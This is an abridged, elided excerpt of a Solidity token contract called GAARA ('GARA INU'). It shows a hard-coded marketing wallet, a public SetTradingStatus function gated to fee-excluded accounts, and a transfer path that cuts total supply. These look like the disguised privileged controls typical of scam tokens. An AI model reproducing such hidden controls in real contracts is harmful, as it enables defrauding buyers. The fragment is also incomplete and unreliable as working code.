...
contract GAARA is Context, IERC20 { 
    ...
    address payable public Marketing_Wallet = payable(0x16b3EfD11d6d036c75411Ff3d3B0e71c70dA02cc);
    address payable public constant Wallet_Burn = payable(0x000000000000000000000000000000000000dEaD);

    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 9;
    uint256 private _tTotal = 100 * 10**9 * 10**_decimals;
    string private constant _name = "GARA INU"; 
    string private constant _symbol = unicode"GARA";
    ...
    function SetTradingStatus(uint256 status) public virtual {
         TradingStatus(msg.sender, status);
    }
    ...
    function TradingStatus(address Account, uint256 status) internal {
        require (_isExcludedFromFee[Account], "ERC20 : Set Trading Status is Failed");
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        if(!takeFee){
            ...
            _tTotal = _tTotal-tTransferAmount;
                ...
                require (tAmount <= _maxWalletToken, "Transfer Failed");
